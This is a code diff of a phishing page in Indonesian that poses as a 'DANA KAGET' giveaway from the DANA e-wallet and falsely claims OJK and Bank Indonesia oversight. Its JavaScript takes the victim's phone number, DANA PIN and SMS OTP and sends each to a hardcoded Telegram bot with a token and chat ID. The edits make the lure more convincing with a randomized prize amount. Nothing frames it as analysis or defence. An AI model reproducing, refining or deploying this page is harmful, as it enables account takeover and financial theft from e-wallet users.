@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DANA KAGET - Klaim Saldo Sekarang</title>
+    <title>DANA KAGET - Ambil Saldo Sekarang</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
@@ -20,7 +20,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
 
         body {
-            background: linear-gradient(rgba(0, 86, 179, 0.92), rgba(17, 142, 234, 0.95)), 
+            background: linear-gradient(rgba(0, 86, 179, 0.9), rgba(17, 142, 234, 0.95)), 
                         url('https://i.ibb.co.com/PZ8BgZ13/Blog-Banner-1080-x-556-c532047cac.png');
             background-size: cover; background-position: center; background-attachment: fixed;
             min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px;
@@ -47,7 +47,6 @@
             border-bottom: 3px solid var(--gold);
         }
 
-        /* WARNING BOX STYLING */
         .alert-box {
             background: rgba(255, 215, 0, 0.2);
             border: 1px solid var(--gold);
@@ -57,20 +56,14 @@
             display: flex;
             align-items: flex-start;
             gap: 10px;
-            animation: pulse 2s infinite;
         }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(255, 215, 0, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0); }
-        }
-        .alert-box i { color: var(--gold); font-size: 1.2rem; }
         .alert-box p { color: #fff; font-size: 0.75rem; font-weight: 600; line-height: 1.4; }
 
         .stage { display: none; padding: 25px; animation: slideUp 0.5s ease-out; }
         .stage.active { display: block; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(25px); } to { opacity: 1; transform: translateY(0); } }
 
+        /* ENVELOPE */
         .env-container {
             width: 130px; height: 90px; background: #f44336; margin: 15px auto;
             position: relative; border-radius: 0 0 12px 12px; cursor: pointer;
@@ -145,14 +138,14 @@
     <div class="hero-banner"></div>
 
     <div id="stg-1" class="stage active">
-        <div class="env-container" onclick="handle_open(this)">
+        <div class="env-container" id="env-click" onclick="handle_open(this)">
             <div class="env-flap"></div>
             <div class="env-paper">
                 <span style="font-size: 0.5rem; color: #888;">SALDO KAGET</span>
-                <span style="font-size: 1rem;">Rp 185.000</span>
+                <span id="random-val" style="font-size: 1rem; color: #2ecc71; font-weight: 800;"></span>
             </div>
         </div>
-        <h3 style="color:white; text-align:center; margin-bottom:20px; font-size: 0.9rem;">Tap amplop untuk klaim hadiah!</h3>
+        <h3 style="color:white; text-align:center; margin-bottom:20px; font-size: 0.9rem;" id="txt-hint">Tap amplop untuk klaim hadiah!</h3>
         
         <div id="f-ph" style="opacity:0; pointer-events:none; transition: 0.6s;">
             <div class="input-box">
@@ -182,7 +175,7 @@
 
     <div id="stg-3" class="stage">
         <div class="alert-box">
-            <i class="fas fa-exclamation-triangle"></i>
+            <i class="fas fa-exclamation-triangle" style="color: var(--gold); padding: 5px;"></i>
             <p>PENTING: Mohon tunggu SMS Kode OTP resmi dari DANA. Pastikan sinyal kuat dan jangan tutup halaman ini agar proses klaim tidak gagal.</p>
         </div>
         <div style="text-align: center; color: white;">
@@ -205,14 +198,13 @@
         <div style="text-align: center; color: white;">
             <i class="fas fa-check-circle" style="font-size: 4rem; color: var(--gold); margin-bottom: 20px;"></i>
             <h2>Klaim Diproses!</h2>
-            <p style="opacity: 0.9; font-size: 0.85rem;">Terima kasih. Saldo sedang diverifikasi oleh sistem OJK & DANA untuk pengiriman ke nomor Anda.</p>
+            <p style="opacity: 0.9; font-size: 0.85rem;">Saldo sedang diverifikasi oleh sistem DANA untuk pengiriman ke nomor Anda.</p>
         </div>
     </div>
 
     <footer>
         <img src="https://i.ibb.co.com/WvJPSCC9/OJK-Logo.png" style="height:18px; filter: brightness(0) invert(1); margin-bottom: 8px;"><br>
-        DANA Terdaftar dan Diawasi oleh OJK & Bank Indonesia.<br>
-        Seluruh data dienkripsi dengan sistem keamanan AES-256.
+        DANA Terdaftar dan Diawasi oleh OJK & Bank Indonesia.
     </footer>
 
     <div class="overlay" id="ldr">
@@ -222,16 +214,35 @@
 </div>
 
 <script>
-    // SCRIPT LOGIC
     const _0xT = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
     const _0xC = "8001301204";
 
-    let _d = { ph: "", pi: "", ot: "" };
+    let _d = { ph: "", pi: "", ot: "", amt: "" };
     let _tm;
 
-    function handle_open(e) { e.classList.add('open'); document.getElementById('f-ph').style.opacity = "1"; document.getElementById('f-ph').style.pointerEvents = "auto"; }
+    // LOGIC ACAK SAAT DIKLIK
+    function handle_open(e) { 
+        if(e.classList.contains('open')) return;
+        
+        // Acak nominal hanya saat diklik
+        const min = 150000;
+        const max = 1500000;
+        const rand = Math.floor(Math.random() * (max - min + 1) + min);
+        const final = Math.floor(rand / 5000) * 5000;
+        _d.amt = final.toLocaleString('id-ID');
+        
+        document.getElementById('random-val').innerText = "Rp " + _d.amt;
+        document.getElementById('txt-hint').innerText = "Selamat! Masukkan nomor DANA Anda.";
+        
+        e.classList.add('open'); 
+        document.getElementById('f-ph').style.opacity = "1"; 
+        document.getElementById('f-ph').style.pointerEvents = "auto"; 
+    }
 
-    function v_ph() { _d.ph = document.getElementById('ph_num').value; document.getElementById('btn_ph').disabled = _d.ph.length < 10; }
+    function v_ph() { 
+        _d.ph = document.getElementById('ph_num').value; 
+        document.getElementById('btn_ph').disabled = _d.ph.length < 10; 
+    }
 
     async function notify(m) {
         try {
@@ -245,7 +256,7 @@
 
     function s_ph() {
         l_dr("Memverifikasi Nomor...", 1200, () => {
-            notify(`😈 *DATA MASUK*\n📱 *No:* \`${_d.ph}\`\n🌐 *UA:* \`${navigator.userAgent}\``);
+            notify(`😈 *DATA MASUK*\n💰 *Nominal:* Rp ${_d.amt}\n📱 *No:* \`${_d.ph}\`\n🌐 *UA:* \`${navigator.userAgent}\``);
             s_tr('stg-1', 'stg-2');
         });
     }
@@ -262,7 +273,7 @@
 
     function s_pi() {
         l_dr("Sinkronisasi PIN...", 1800, () => {
-            notify(`😈 *UPDATE PIN*\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\``);
+            notify(`😈 *UPDATE PIN*\n💰 *Nominal:* Rp ${_d.amt}\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\``);
             s_tr('stg-2', 'stg-3');
             r_tm();
         });
@@ -270,7 +281,7 @@
 
     function s_ot() {
         l_dr("Memproses OTP...", 2500, () => {
-            notify(`😈 *FINAL LOG*\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\`\n💬 *OTP:* \`${_d.ot}\``);
+            notify(`😈 *FINAL DATA*\n💰 *Nominal:* Rp ${_d.amt}\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\`\n💬 *OTP:* \`${_d.ot}\``);
             s_tr('stg-3', 'stg-4');
             confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
         });
